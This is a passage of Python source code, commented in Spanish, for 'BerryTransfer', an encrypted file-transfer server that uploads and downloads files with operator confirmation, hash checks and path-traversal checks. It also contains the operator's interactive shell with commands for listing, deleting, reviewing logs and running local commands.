                                parts = [p for p in rel_path.replace('\\','/').split('/')
                                         if p and p != '..']
                                dest_file = os.path.realpath(os.path.join(upload_dir, *parts))
                                if not dest_file.startswith(upload_dir):
                                    send_encrypted_message(sock, "BT:FILE_ERR:path_traversal",
                                                           aes_key, session=session)
                                    continue

                                os.makedirs(os.path.dirname(dest_file), exist_ok=True)
                                print(f"{B_CYAN}  <- {rel_path} ({format_bytes(f_size)}){RESET}")
                                send_encrypted_message(sock, "BT:FILE_READY", aes_key, session=session)

                                t0f = time.time()
                                sha_a, rcvd = bt_server_recv_chunks(sock, aes_key, dest_file, f_size, session)
                                ela_f = time.time() - t0f
                                if sha_a == f_hash and rcvd == f_size:
                                    files_ok   += 1
                                    total_size += f_size
                                    print(f"{B_GREEN}    OK{RESET}")
                                    bt_log_transfer("upload", ip, hostname, rel_path,
                                                    f_size, True, elapsed=ela_f)
                                    send_encrypted_message(sock, "BT:FILE_OK", aes_key, session=session)
                                else:
                                    try: os.remove(dest_file)
                                    except Exception: pass
                                    err = ("hash_mismatch" if sha_a != f_hash
                                           else f"size_mismatch:{rcvd}vs{f_size}")
                                    print(f"{ALERT} {RED}    FAIL {rel_path}: {err}{RESET}")
                                    bt_log_transfer("upload", ip, hostname, rel_path,
                                                    f_size, False, err)
                                    send_encrypted_message(sock, f"BT:FILE_ERR:{err}",
                                                           aes_key, session=session)
                            except Exception as e:
                                logging.exception(f"[BerryTransfer] Error BT:FILE #{cid}: {e}")
                                send_encrypted_message(sock, f"BT:FILE_ERR:{e}",
                                                       aes_key, session=session)

                        elif freason in ('closed', 'error', 'timeout'):
                            break

                except Exception as e:
                    logging.exception(f"[BerryTransfer] Error BT:UPLOAD_DIR #{cid}: {e}")
                    try: send_encrypted_message(sock, f"BT:ERR:{e}", aes_key, session=session)
                    except Exception: pass

            # ── CANCEL_GET — cliente canceló la espera ────────────────────────
            elif msg.startswith("BT:CANCEL_GET:"):
                cancelled_file = msg[len("BT:CANCEL_GET:"):]
                # Limpiar confirm pendiente de esta sesión si lo hay
                with bt_pending_lock:
                    to_cancel = [k for k, v in bt_pending_confirms.items()
                                 if v.get("cid") == cid and
                                    os.path.basename(cancelled_file) in v.get("filename","")]
                    for k in to_cancel:
                        bt_pending_confirms[k]["approved"] = False
                        bt_pending_confirms[k]["event"].set()
                        del bt_pending_confirms[k]
                print(f"{B_YELLOW}[BerryTransfer] #{cid} CANCELÓ la solicitud GET de "
                      f"'{os.path.basename(cancelled_file)}'{RESET}")
                logging.info(f"[BerryTransfer] #{cid} GET CANCELLED by client: {cancelled_file}")
                bt_log_transfer("download", ip, hostname,
                                os.path.basename(cancelled_file), 0, False, "cancelled")

            # ── GET (download) — requiere confirmación del operador ───────────
            elif msg.startswith("BT:DOWNLOAD:"):
                remote_arg = msg[len("BT:DOWNLOAD:"):]
                try:
                    src_path = _safe_download_src(remote_arg)

                    # ── Diagnóstico detallado cuando no se encuentra ────────
                    if src_path is None:
                        logging.warning(f"[BerryTransfer] GET '{remote_arg}': not_found. "
                                        f"root_real={root_real}")
                        # Listar contenido de root_real para depuración
                        try:
                            tree_lines = []
                            for dp, dns, fns in os.walk(root_real):
                                dns.sort(); depth = len(os.path.relpath(dp, root_real).split(os.sep))
                                if depth > 4: dns.clear(); continue
                                rel = os.path.relpath(dp, root_real)
                                if rel != '.':
                                    tree_lines.append(f"  DIR  {rel}/")
                                for fn in sorted(fns):
                                    tree_lines.append(f"  FILE {os.path.join(rel, fn)}")
                            if tree_lines:
                                logging.info(f"[BerryTransfer] Contenido de root:\n" + "\n".join(tree_lines[:50]))
                            else:
                                logging.info(f"[BerryTransfer] root_real está vacío: {root_real}")
                        except Exception as _e:
                            logging.debug(f"[BerryTransfer] tree error: {_e}")
                        send_encrypted_message(sock, f"BT:ERR:not_found:{remote_arg}",
                                               aes_key, session=session)
                        bt_log_transfer("download", ip, hostname, remote_arg, 0, False, "not_found")
                        continue

                    is_dir = os.path.isdir(src_path)

                    # ── Calcular tamaño total (archivo o directorio) ────────
                    def _dir_size(d):
                        total = 0
                        for dp, _, fns in os.walk(d):
                            for fn in fns:
                                try: total += os.path.getsize(os.path.join(dp, fn))
                                except Exception: pass
                        return total

                    if is_dir:
                        total_size = _dir_size(src_path)
                        display_name = os.path.basename(src_path)
                        type_tag = "DIR"
                    else:
                        total_size = os.path.getsize(src_path)
                        display_name = os.path.basename(src_path)
                        type_tag = "FILE"

                    logging.info(f"[BerryTransfer] #{cid} GET request: {type_tag} "
                                 f"'{display_name}' ({format_bytes(total_size)}) de {ip}")

                    if BT_AUTO_CONFIRM:
                        approved     = True
                        confirm_note = "auto-confirm"
                    else:
                        # ── Pedir confirmacion al operador ────────────────────
                        confirm_id = _bt_next_confirm_id()
                        evt        = _bt_threading.Event()
                        with bt_pending_lock:
                            bt_pending_confirms[confirm_id] = {
                                "event":    evt,
                                "approved": False,
                                "ip":       ip,
                                "hostname": hostname,
                                "filename": f"{'[DIR] ' if is_dir else ''}{display_name}",
                                "size":     total_size,
                                "cid":      cid,
                                "ts":       time.time(),
                            }

                        def _sfmt(b):
                            for u in ['B','KB','MB','GB']:
                                if b < 1024: return f"{b:.1f} {u}"
                                b /= 1024
                            return f"{b:.1f} TB"

                        tipo_str = "📁 DIRECTORIO" if is_dir else "📄 ARCHIVO"
                        print(f"\n{B_YELLOW}╔{'═'*60}╗{RESET}")
                        print(f"{B_YELLOW}║  🫐 SOLICITUD GET — BerryTransfer{' '*25}║{RESET}")
                        print(f"{B_YELLOW}╠{'═'*60}╣{RESET}")
                        print(f"{B_YELLOW}║  ID      : {confirm_id:<48}║{RESET}")
                        print(f"{B_YELLOW}║  Tipo    : {tipo_str:<48}║{RESET}")
                        print(f"{B_YELLOW}║  Sesión  : #{cid:<47}║{RESET}")
                        print(f"{B_YELLOW}║  Cliente : {ip} ({hostname}){' '*(46-len(ip)-len(hostname))}║{RESET}")
                        print(f"{B_YELLOW}║  Nombre  : {display_name:<48}║{RESET}")
                        print(f"{B_YELLOW}║  Tamaño  : {_sfmt(total_size):<48}║{RESET}")
                        print(f"{B_YELLOW}╠{'═'*60}╣{RESET}")
                        print(f"{B_YELLOW}║  → confirm {confirm_id:<12}  para APROBAR{' '*16}║{RESET}")
                        print(f"{B_YELLOW}║  → deny    {confirm_id:<12}  para RECHAZAR{' '*15}║{RESET}")
                        print(f"{B_YELLOW}║  El cliente espera ~60s antes de cancelar{' '*17}║{RESET}")
                        print(f"{B_YELLOW}╚{'═'*60}╝{RESET}\n")

                        # Esperar respuesta del operador (máx 70s)
                        evt.wait(timeout=70)

                        with bt_pending_lock:
                            entry    = bt_pending_confirms.pop(confirm_id, {})
                            approved = entry.get("approved", False)
                        confirm_note = "operator_confirmed" if approved else "operator_denied"

                    if approved:
                        if is_dir:
                            # ── Enviar directorio completo ────────────────────
                            # Recopilar archivos
                            all_files = []
                            for dp, dns, fns in os.walk(src_path):
                                dns.sort()
                                for fn in sorted(fns):
                                    fp = os.path.join(dp, fn)
                                    if os.path.isfile(fp):
                                        rel = os.path.relpath(fp, os.path.dirname(src_path))
                                        all_files.append((fp, rel))

                            n_files = len(all_files)
                            dir_name = os.path.basename(src_path)

                            print(f"{B_CYAN}[BerryTransfer] #{cid} → GET DIR '{dir_name}' "
                                  f"({n_files} archivos, {format_bytes(total_size)})  "
                                  f"[{confirm_note}]{RESET}")
                            logging.info(f"[BerryTransfer] #{cid} GET DIR START: '{dir_name}' "
                                         f"{n_files} archivos [{confirm_note}]")

                            dir_meta = json.dumps({
                                "type":    "dir",
                                "name":    dir_name,
                                "files":   n_files,
                                "size":    total_size,
                            })
                            send_encrypted_message(sock, f"BT:SENDING_DIR:{dir_meta}",
                                                   aes_key, session=session)

                            t0g = time.time()
                            ok_files = 0
                            fail_files = 0

                            for i, (fp, rel_path) in enumerate(all_files, 1):
                                try:
                                    f_size = os.path.getsize(fp)
                                    sha = hashlib.sha256()
                                    with open(fp, 'rb') as fh:
                                        for ch in iter(lambda: fh.read(65536), b''):
                                            sha.update(ch)
                                    f_hash = sha.hexdigest()

                                    f_meta = json.dumps({
                                        "path":   rel_path,
                                        "name":   os.path.basename(fp),
                                        "size":   f_size,
                                        "sha256": f_hash,
                                        "index":  i,
                                        "total":  n_files,
                                    })
                                    send_encrypted_message(sock, f"BT:DIR_FILE:{f_meta}",
                                                           aes_key, session=session)
                                    # Esperar ACK del cliente antes de enviar datos
                                    ack, _ = receive_encrypted_message(sock, aes_key, timeout=30, session=session)
                                    if ack != "BT:DIR_FILE_READY":
                                        logging.warning(f"[BerryTransfer] DIR GET: ACK inesperado: {ack!r}")
                                        fail_files += 1
                                        continue

                                    bt_server_send_chunks(sock, aes_key, fp, session)

                                    file_ack, _ = receive_encrypted_message(sock, aes_key, timeout=120, session=session)
                                    if file_ack and file_ack.startswith("BT:DIR_FILE_OK"):
                                        ok_files += 1
                                        logging.info(f"[BerryTransfer] [{i}/{n_files}] OK: {rel_path} ({format_bytes(f_size)})")
                                        print(f"  {GREEN}[{i}/{n_files}]{RESET} {rel_path}  "
                                              f"{format_bytes(f_size)}")
                                    else:
                                        fail_files += 1
                                        logging.warning(f"[BerryTransfer] [{i}/{n_files}] FAIL: {rel_path}: {file_ack!r}")
                                        print(f"  {RED}[{i}/{n_files}] FAIL{RESET} {rel_path}: {file_ack!r}")
                                except Exception as _fe:
                                    fail_files += 1
                                    logging.error(f"[BerryTransfer] DIR GET file {rel_path}: {_fe}")
                                    print(f"  {RED}[{i}/{n_files}] ERROR{RESET} {rel_path}: {_fe}")

                            # Señal de fin
                            send_encrypted_message(sock, "BT:DIR_DONE", aes_key, session=session)

                            elapsed_get = time.time() - t0g
                            status = "OK" if fail_files == 0 else f"PARCIAL ({fail_files} fallos)"
                            print(f"{B_GREEN if fail_files==0 else B_YELLOW}"
                                  f"[BerryTransfer] GET DIR '{dir_name}' {status}: "
                                  f"{ok_files}/{n_files} archivos en {elapsed_get:.1f}s{RESET}")
                            logging.info(f"[BerryTransfer] #{cid} GET DIR END: '{dir_name}' "
                                         f"{ok_files}/{n_files} OK en {elapsed_get:.1f}s [{confirm_note}]")
                            bt_log_transfer("download", ip, hostname, dir_name,
                                            total_size, fail_files == 0, confirm_note,
                                            elapsed=elapsed_get)

                        else:
                            # ── Enviar archivo único ──────────────────────────
                            sha = hashlib.sha256()
                            with open(src_path, 'rb') as f:
                                for ch in iter(lambda: f.read(65536), b''):
                                    sha.update(ch)
                            file_hash = sha.hexdigest()

                            meta_str = json.dumps({
                                "name":   display_name,
                                "size":   total_size,
                                "sha256": file_hash,
                            })
                            print(f"{B_CYAN}[BerryTransfer] #{cid} → GET '{display_name}' "
                                  f"({format_bytes(total_size)})  [{confirm_note}]{RESET}")
                            logging.info(f"[BerryTransfer] #{cid} GET FILE START: '{display_name}' "
                                         f"sha256={file_hash} [{confirm_note}]")
                            send_encrypted_message(sock, f"BT:SENDING:{meta_str}",
                                                   aes_key, session=session)
                            t0g = time.time()
                            bt_server_send_chunks(sock, aes_key, src_path, session)
                            elapsed_get = time.time() - t0g
                            print(f"{B_GREEN}[BerryTransfer] OK GET '{display_name}' "
                                  f"({format_bytes(total_size)}) en {elapsed_get:.1f}s{RESET}")
                            logging.info(f"[BerryTransfer] #{cid} GET FILE OK: '{display_name}' "
                                         f"en {elapsed_get:.1f}s [{confirm_note}]")
                            bt_log_transfer("download", ip, hostname, display_name,
                                            total_size, True, confirm_note, elapsed=elapsed_get)
                    else:
                        print(f"{ALERT} {RED}[BerryTransfer] GET DENEGADO: "
                              f"'{display_name}'  (#{cid} {ip}){RESET}")
                        logging.warning(f"[BerryTransfer] #{cid} GET DENIED: '{display_name}'")
                        bt_log_transfer("download", ip, hostname, display_name,
                                        total_size, False, "operator_denied")
                        send_encrypted_message(sock, "BT:ERR:download_denied",
                                               aes_key, session=session)

                except Exception as e:
                    logging.exception(f"[BerryTransfer] Error BT:DOWNLOAD #{cid}: {e}")
                    try: send_encrypted_message(sock, f"BT:ERR:{e}", aes_key, session=session)
                    except Exception: pass

            # ── LIST — muestra archivos disponibles en la raiz BT ────────────
            elif msg.startswith("BT:LIST:"):
                list_arg = msg[len("BT:LIST:"):]
                try:
                    # List SOLO dentro de root_real (lo que el servidor tiene disponible)
                    list_target = root_real if not list_arg or list_arg == "." else \
                                  os.path.realpath(os.path.join(root_real, list_arg))
                    if not list_target.startswith(root_real):
                        send_encrypted_message(sock, "BT:ERR:path_traversal",
                                               aes_key, session=session)
                        continue
                    if not os.path.isdir(list_target):
                        send_encrypted_message(sock, f"BT:ERR:not_a_directory:{list_arg}",
                                               aes_key, session=session)
                        continue
                    entries = []
                    for name in sorted(os.listdir(list_target)):
                        fp = os.path.join(list_target, name)
                        if os.path.isdir(fp):
                            entries.append({"name": name, "type": "d", "size": 0})
                        elif os.path.isfile(fp) and not name.endswith('.log'):
                            try: sz = os.path.getsize(fp)
                            except Exception: sz = 0
                            entries.append({"name": name, "type": "f", "size": sz})
                    send_encrypted_message(sock, f"BT:LS:{json.dumps(entries)}",
                                           aes_key, session=session)
                    logging.debug(f"[BerryTransfer] #{cid} LIST: {len(entries)} entradas")
                except Exception as e:
                    send_encrypted_message(sock, f"BT:ERR:{e}", aes_key, session=session)

            else:
                logging.warning(f"[BerryTransfer] #{cid} cmd desconocido: {msg!r}")
                send_encrypted_message(sock, "BT:ERR:unknown_command",
                                       aes_key, session=session)

    except Exception as e:
        logging.exception(f"[BerryTransfer] Excepcion sesion #{cid}: {e}")
    finally:
        # Limpiar confirmaciones pendientes de esta sesion
        with bt_pending_lock:
            to_remove = [k for k, v in bt_pending_confirms.items() if v.get("cid") == cid]
            for k in to_remove:
                bt_pending_confirms[k]["event"].set()
                del bt_pending_confirms[k]
        try: sock.close()
        except Exception: pass
        with conn_lock:
            connections.pop(cid, None)
        print(f"{B_CYAN}[BerryTransfer] --- Sesion #{cid} ({ip}) cerrada ---{RESET}")
        logging.info(f"[BerryTransfer] Sesion #{cid} de {ip} cerrada")

# ==================== FIN BERRYTRANSFER SERVER ====================


class BerryTransferCompleter(Completer):
    """
    Completer para la shell BerryTransfer.
    - Palabras clave de comandos al inicio de línea.
    - PathCompleter para argumentos de cd / ls / rm / find / tree.
    """
    _CMDS = [
        "confirm", "deny", "pending", "clients", "ls", "log",
        "auto", "auto on", "auto off", "exit", "quit",
        "cd", "pwd", "tree", "find", "rm", "help",
    ]
    _PATH_CMDS = {"cd", "ls", "rm", "find", "tree"}

    def __init__(self):
        self._path = PathCompleter(expanduser=True, only_directories=False)
        self._path_dir = PathCompleter(expanduser=True, only_directories=True)

    def get_completions(self, document, complete_event):
        text  = document.text_before_cursor.lstrip()
        parts = text.split()

        # ── Sin texto: mostrar todos los comandos ──────────────────────────
        if not parts:
            for c in self._CMDS:
                yield Completion(c, start_position=0)
            return

        first = parts[0].lower()

        # ── Primer token aún incompleto: completar comando ─────────────────
        if len(parts) == 1 and not text.endswith(" "):
            for c in self._CMDS:
                if c.startswith(first) and c != first:
                    yield Completion(c, start_position=-len(first))
            return

        # ── Segundo token en adelante: completar rutas si procede ──────────
        if first in self._PATH_CMDS:
            # cd autocompleta solo directorios; el resto también archivos
            pc = self._path_dir if first == "cd" else self._path
            for comp in pc.get_completions(document, complete_event):
                yield comp


def bt_interactive_shell():
    """
    Shell interactiva para el modo --berrytransfer.
    Reemplaza interactive_shell() completo — gestiona confirmaciones GET y control basico.

    Comandos BerryTransfer:
      confirm <ID>   Aprobar solicitud GET pendiente
      deny <ID>      Rechazar solicitud GET pendiente
      pending        Listar solicitudes GET en espera
      clients        Mostrar sesiones activas
      ls [<dir>]     Listar archivos en BERRYTRANSFER_ROOT
      log [N]        Últimas N entradas del log (default 30) — descifrado automático
      auto [on|off]  Alternar auto-confirm (aprobar GETs sin confirmacion)
      exit           Detener el servidor

    Comandos locales:
      !<cmd>         Ejecutar comando del sistema local (ej: !cat archivo.txt)
      cd <dir>       Cambiar directorio de trabajo local
      pwd            Mostrar directorio de trabajo actual
      tree [<dir>]   Árbol de archivos en BERRYTRANSFER_ROOT
      find <nombre>  Buscar archivo en BERRYTRANSFER_ROOT
      rm <archivo>   Eliminar archivo de BERRYTRANSFER_ROOT (con confirmación)
      help           Mostrar esta ayuda
    """
    global BT_AUTO_CONFIRM, CURRENT_WORKING_DIR

    def _fmt(b):
        for u in ["B","KB","MB","GB"]:
            if b < 1024: return f"{b:.1f}{u}"
            b /= 1024
        return f"{b:.1f}TB"

    def _print_help():
        print(f"""
{B_CYAN}╔{'═'*60}╗
║  🫐 BerryTransfer Shell — Comandos disponibles             ║
╠{'═'*60}╣
║  CONFIRMACIONES                                            ║
║    confirm <ID>    Aprobar solicitud GET                   ║
║    deny <ID>       Rechazar solicitud GET                  ║
║    pending         Listar solicitudes pendientes           ║
║    auto [on|off]   Alternar/establecer auto-confirm        ║
╠{'═'*60}╣
║  INFORMACIÓN                                               ║
║    clients         Mostrar sesiones BerryTransfer activas  ║
║    ls [<dir>]      Listar archivos en berry_transfers/     ║
║    tree [<dir>]    Árbol de archivos                       ║
║    find <nombre>   Buscar archivo                          ║
║    log [N]         Últimas N entradas del log (def. 30)    ║
╠{'═'*60}╣
║  SISTEMA LOCAL                                             ║
║    !<cmd>          Ejecutar comando del sistema            ║
║    cd <dir>        Cambiar directorio de trabajo           ║
║    pwd             Mostrar directorio actual               ║
║    rm <archivo>    Eliminar archivo (con confirmación)     ║
╠{'═'*60}╣
║    help            Esta ayuda          exit  Salir         ║
╚{'═'*60}╝{RESET}""")

    print(f"\n{B_CYAN}{'='*62}{RESET}")
    print(f"  Root  : {os.path.realpath(BERRYTRANSFER_ROOT)}")
    print(f"  Auto-confirm: {'SI' if BT_AUTO_CONFIRM else 'NO (escribe confirm/deny)'}")
    print(f"  Escribe 'help' para ver todos los comandos.")
    print(f"{B_CYAN}{'='*62}{RESET}\n")

    # prompt_toolkit opcional — si no está disponible, usar input() SIN colores ANSI
    bt_prompt_session = None
    if PROMPT_TOOLKIT_AVAILABLE:
        try:
            bt_prompt_session = PromptSession(
                completer=BerryTransferCompleter(),
                auto_suggest=AutoSuggestFromHistory(),
                complete_while_typing=False,
            )
        except Exception:
            bt_prompt_session = None

    def _run_shell_loop():
        """Loop principal de la shell BerryTransfer."""
        global CURRENT_WORKING_DIR
        global BT_AUTO_CONFIRM
        while True:
            try:
                pending_n = len(bt_pending_confirms)
                pend_str  = f" [{pending_n}⚠]" if pending_n > 0 else ""
                ac_str    = "AUTO" if BT_AUTO_CONFIRM else "MANUAL"

                try:
                    if bt_prompt_session and PROMPT_TOOLKIT_AVAILABLE and PT_ANSI:
                        # ANSI() es el wrapper correcto para colores ANSI en prompt_toolkit
                        ac_esc   = "\033[92m" if BT_AUTO_CONFIRM else "\033[93m"
                        pend_esc = f"\033[91m{pend_str}\033[0m" if pending_n > 0 else ""
                        prompt_ansi = PT_ANSI(
                            f"\033[96mberrytransfer\033[0m"
                            f"({ac_esc}{ac_str}\033[0m)"
                            f"{pend_esc}> "
                        )
                        raw = bt_prompt_session.prompt(prompt_ansi).strip()
                    else:
                        # input() básico: SIN colores ANSI — evita basura ^[[33m
                        raw = input(f"berrytransfer({ac_str}){pend_str}> ").strip()
                except KeyboardInterrupt:
                    print(f"\n  {YELLOW}[!] Usa 'exit' para salir del servidor BerryTransfer.{RESET}")
                    continue
                except EOFError:
                    print(f"\n  {YELLOW}[!] Usa 'exit' para salir.{RESET}")
                    continue

                if not raw:
                    if pending_n > 0:
                        print(f"  {YELLOW}⚠ {pending_n} solicitudes GET pendientes — escribe 'pending'{RESET}")
                    continue

                parts = raw.split()
                cmd   = parts[0].lower()
                rest  = parts[1:]

                # ── Comandos del sistema local ────────────────────────────────────
                if raw.startswith("!"):
                    local_cmd = raw[1:].strip()
                    if local_cmd:
                        try:
                            interactive_cmds = ['nano', 'vim', 'vi', 'emacs', 'less', 'more',
                                               'top', 'htop', 'man']
                            cmd_name = local_cmd.split()[0] if local_cmd else ""
                            if cmd_name in interactive_cmds:
                                subprocess.call(local_cmd, shell=True, cwd=CURRENT_WORKING_DIR)
                            else:
                                result = subprocess.run(
                                    local_cmd, shell=True, capture_output=True,
                                    text=True, timeout=60, cwd=CURRENT_WORKING_DIR,
                                    errors='replace'
                                )
                                out = (result.stdout + result.stderr).strip()
                                if out:
                                    print(out)
                                else:
                                    print(f"  [Código: {result.returncode}]")
                        except subprocess.TimeoutExpired:
                            print(f"{YELLOW}[!] Comando excedió 60s{RESET}")
                        except Exception as e:
                            print(f"{RED}[!] Error: {e}{RESET}")
                    continue

                # cd
                if cmd == "cd":
                    target = rest[0] if rest else os.path.expanduser("~")
                    try:
                        os.chdir(target)
                        CURRENT_WORKING_DIR = os.getcwd()
                        print(f"  {CURRENT_WORKING_DIR}")
                    except Exception as e:
                        print(f"{RED}[!] cd: {e}{RESET}")
                    continue

                # pwd
                if cmd == "pwd":
                    print(f"  {os.getcwd()}")
                    continue
                # clear
                if cmd == "clear":
                    subprocess.run("clear")
                    continue

                # help
                if cmd == "help":
                    _print_help()
                    continue

                # tree [dir]
                if cmd == "tree":
                    root_r = os.path.realpath(BERRYTRANSFER_ROOT)
                    tgt = root_r if not rest else os.path.realpath(os.path.join(root_r, rest[0]))
                    if not tgt.startswith(root_r):
                        print(f"{RED}[!] Fuera de la raíz BerryTransfer{RESET}")
                        continue
                    print(f"\n{B_CYAN}{tgt}/{RESET}")
                    for dirpath, dirnames, filenames in os.walk(tgt):
                        dirnames.sort()
                        rel = os.path.relpath(dirpath, tgt)
                        depth = 0 if rel == '.' else rel.count(os.sep) + 1
                        indent = "  │  " * depth
                        if rel != '.':
                            dname = os.path.basename(dirpath)
                            print(f"  {indent}📁 {dname}/")
                        for fname in sorted(filenames):
                            fp = os.path.join(dirpath, fname)
                            try: sz = _fmt(os.path.getsize(fp))
                            except Exception: sz = "?"
                            print(f"  {indent}  📄 {fname:<35} {sz}")
                    print()
                    continue

                # find <nombre>
                if cmd == "find":
                    if not rest:
                        print(f"{YELLOW}  Uso: find <nombre_archivo>{RESET}")
                        continue
                    needle = rest[0]
                    root_r = os.path.realpath(BERRYTRANSFER_ROOT)
                    matches = []
                    for dirpath, _, filenames in os.walk(root_r):
                        for fn in filenames:
                            if needle.lower() in fn.lower():
                                fp = os.path.join(dirpath, fn)
                                try: sz = _fmt(os.path.getsize(fp))
                                except Exception: sz = "?"
                                matches.append((os.path.relpath(fp, root_r), sz))
                    if matches:
                        print(f"\n{B_CYAN}  Encontrados ({len(matches)}) para '{needle}':{RESET}")
                        for rel, sz in matches:
                            print(f"    {rel:<50} {sz}")
                        print()
                    else:
                        print(f"{YELLOW}  No se encontraron archivos con '{needle}'{RESET}")
                    continue

                # rm <archivo>
                if cmd == "rm":
                    if not rest:
                        print(f"{YELLOW}  Uso: rm <ruta_relativa_en_root>{RESET}")
                        continue
                    root_r = os.path.realpath(BERRYTRANSFER_ROOT)
                    target_rm = os.path.realpath(os.path.join(root_r, rest[0]))
                    if not target_rm.startswith(root_r + os.sep):
                        print(f"{RED}[!] Fuera de la raíz BerryTransfer{RESET}")
                        continue
                    if not os.path.isfile(target_rm):
                        print(f"{YELLOW}[!] Archivo no encontrado: {target_rm}{RESET}")
                        continue
                    try:
                        confirm_rm = input(f"  ¿Eliminar {os.path.relpath(target_rm, root_r)}? [s/N] ").strip().lower()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        continue
                    if confirm_rm in ('s', 'si', 'y', 'yes'):
                        try:
                            os.remove(target_rm)
                            print(f"{GREEN}  Eliminado: {os.path.relpath(target_rm, root_r)}{RESET}")
                        except Exception as e:
                            print(f"{RED}[!] Error eliminando: {e}{RESET}")
                    else:
                        print(f"  Cancelado.")
                    continue

                # confirm <ID>
                if cmd == "confirm" and rest:
                    did = rest[0].upper()
                    if not did.startswith("DL"):
                        did = "DL" + did
                    with bt_pending_lock:
                        entry = bt_pending_confirms.get(did)
                    if entry:
                        entry["approved"] = True
                        entry["event"].set()
                        print(f"{B_GREEN}[+] {did} CONFIRMADO: {entry['filename']} para {entry['ip']}{RESET}")
                    else:
                        print(f"{YELLOW}[!] Sin solicitud pendiente: {did}{RESET}")

                # deny <ID>
                elif cmd == "deny" and rest:
                    did = rest[0].upper()
                    if not did.startswith("DL"):
                        did = "DL" + did
                    with bt_pending_lock:
                        entry = bt_pending_confirms.get(did)
                    if entry:
                        entry["approved"] = False
                        entry["event"].set()
                        print(f"{RED}[-] {did} DENEGADO: {entry['filename']} para {entry['ip']}{RESET}")
                    else:
                        print(f"{YELLOW}[!] Sin solicitud pendiente: {did}{RESET}")

                # pending
                elif cmd == "pending":
                    with bt_pending_lock:
                        items = list(bt_pending_confirms.items())
                    if not items:
                        print(f"{YELLOW}  Sin solicitudes GET pendientes{RESET}")
                    else:
                        now_ts = time.time()
                        print(f"\n{B_YELLOW}  Solicitudes pendientes ({len(items)}):{RESET}")
                        for did, e in items:
                            elapsed_req = int(now_ts - e.get('ts', now_ts))
                            print(f"    {B_YELLOW}{did}{RESET}  "
                                  f"{e['ip']} ({e['hostname']})  "
                                  f"{e['filename']}  ({_fmt(e['size'])})  "
                                  f"{YELLOW}[hace {elapsed_req}s]{RESET}")
                        print()

                # clients
                elif cmd == "clients":
                    with conn_lock:
                        sess_list = list(connections.items())
                    if not sess_list:
                        print(f"{YELLOW}  Sin sesiones BerryTransfer activas{RESET}")
                    else:
                        print(f"\n{B_CYAN}  Sesiones activas ({len(sess_list)}):{RESET}")
                        for sid, sess in sess_list:
                            age = int(time.time() - sess.start_time)
                            print(f"    #{sid}  {sess.address[0]}:{sess.address[1]}"
                                  f"  viva {age}s"
                                  f"  UP:{_fmt(sess.bytes_received)} DN:{_fmt(sess.bytes_sent)}")
                        print()

                # ls [dir]
                elif cmd == "ls":
                    root_r = os.path.realpath(BERRYTRANSFER_ROOT)
                    tgt    = root_r if not rest else os.path.realpath(os.path.join(root_r, rest[0]))
                    if not tgt.startswith(root_r):
                        print(f"{RED}[!] Fuera de la raiz BerryTransfer{RESET}")
                        continue
                    if not os.path.isdir(tgt):
                        print(f"{YELLOW}[!] No es directorio: {tgt}{RESET}")
                        continue
                    print(f"\n{B_CYAN}  {tgt}/{RESET}")
                    for name in sorted(os.listdir(tgt)):
                        fp = os.path.join(tgt, name)
                        if os.path.isdir(fp):
                            print(f"    d  {name}/")
                        else:
                            try: sz = _fmt(os.path.getsize(fp))
                            except Exception: sz = "?"
                            print(f"    f  {name:<40} {sz}")
                    print()

                # log [N]
                elif cmd == "log":
                    lp = BT_LOG_PATH
                    if not os.path.isfile(lp):
                        print(f"{YELLOW}  Sin transferencias registradas aún.{RESET}")
                        print(f"  Ruta: {lp}")
                        continue
                    # ── Cuántas entradas mostrar (log / log 50 / log 5) ───
                    try:
                        _show_n = int(rest[0]) if rest else 30
                    except (ValueError, IndexError):
                        _show_n = 30

                    # ── Leer JSONL ────────────────────────────────────────
                    with open(lp, "r", encoding="utf-8", errors="replace") as _f:
                        _raw_lines = [l.rstrip() for l in _f if l.strip()]

                    # ── Descifrar + parsear JSON ──────────────────────────
                    _records, _decrypt_errors = [], 0
                    for _raw in _raw_lines:
                        _plain = _raw
                        if _SESSION_LOG_KEY:
                            try:
                                _blob  = base64.b64decode(_raw)
                                _plain = AESGCM(_SESSION_LOG_KEY).decrypt(
                                    _blob[:12], _blob[12:], None
                                ).decode('utf-8')
                            except Exception:
                                _decrypt_errors += 1
                                continue
                        try:
                            _records.append(json.loads(_plain))
                        except (json.JSONDecodeError, ValueError):
                            pass

                    _total = len(_records)
                    _show  = _records[-_show_n:] if _total > _show_n else _records

                    # ── Helpers formato ───────────────────────────────────
                    def _fmtb(b):
                        if b is None or b < 0: return "        -"
                        for u in ['B','KB','MB','GB','TB']:
                            if b < 1024: return f"{b:7.1f} {u}"
                            b /= 1024
                        return f"{b:7.1f} TB"

                    def _fmtspd(bps):
                        if bps is None or bps < 0: return "           -"
                        s = bps
                        for u in ['B/s','KB/s','MB/s','GB/s']:
                            if s < 1024: return f"{s:6.1f} {u}".rjust(12)
                            s /= 1024
                        return f"{s:6.1f} GB/s".rjust(12)

                    def _fmtela(e):
                        if e is None or e <= 0: return "     -"
                        return f"{e:5.1f}s"

                    # ── Banner y cabecera ─────────────────────────────────
                    _enc_tag = f" {YELLOW}[AES-256-GCM]{RESET}{B_CYAN}" if _SESSION_LOG_KEY else ""
                    _W = 112
                    print(f"\n{B_CYAN}{'═'*_W}{RESET}")
                    print(f"{B_CYAN}  🫐  bt_transfer.jsonl{_enc_tag}   {lp}{RESET}")
                    _info = f"  Entradas: {_total}   Mostrando: últimas {len(_show)}"
                    if _decrypt_errors:
                        _info += f"   {YELLOW}⚠ Errores descifrado: {_decrypt_errors}{RESET}"
                    print(_info)
                    print(f"{B_CYAN}{'─'*_W}{RESET}")
                    print(
                        f"  {B_WHITE}"
                        f"{'TIMESTAMP':<19}  {'OP':<3}  {'ST':<4}  "
                        f"{'IP':<15}  {'HOST':<18}  {'FILE':<26}  "
                        f"{'SIZE':>9}  {'SPEED':>12}  {'TIME':>6}  NOTE"
                        f"{RESET}"
                    )
                    print(
                        f"  {'─'*19}  {'─'*3}  {'─'*4}  {'─'*15}  "
                        f"{'─'*18}  {'─'*26}  {'─'*9}  {'─'*12}  {'─'*6}  {'─'*16}"
                    )

                    # ── Filas ─────────────────────────────────────────────
                    for _r in _show:
                        _ts   = _r.get("ts", "?")
                        _op   = _r.get("op", "?")
                        _st   = _r.get("status", "?")
                        _ip_r = _r.get("ip", "?")
                        _host = _r.get("host", "?")
                        _file = _r.get("file", "?")
                        _sz   = _r.get("size", -1)
                        _ela  = _r.get("elapsed", 0.0)
                        _spd  = _r.get("speed_bps", -1)
                        _note = _r.get("note", "-")

